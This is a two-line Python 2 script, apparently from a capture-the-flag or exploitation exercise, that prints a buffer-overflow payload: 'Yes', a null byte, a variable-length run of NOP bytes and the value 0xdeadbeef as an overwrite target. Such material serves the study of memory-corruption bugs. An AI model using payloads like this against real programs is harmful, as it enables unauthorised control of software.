import sys

print "Yes\0"+"\x90"*int(sys.argv[1])+"\xef\xbe\xad\xde"
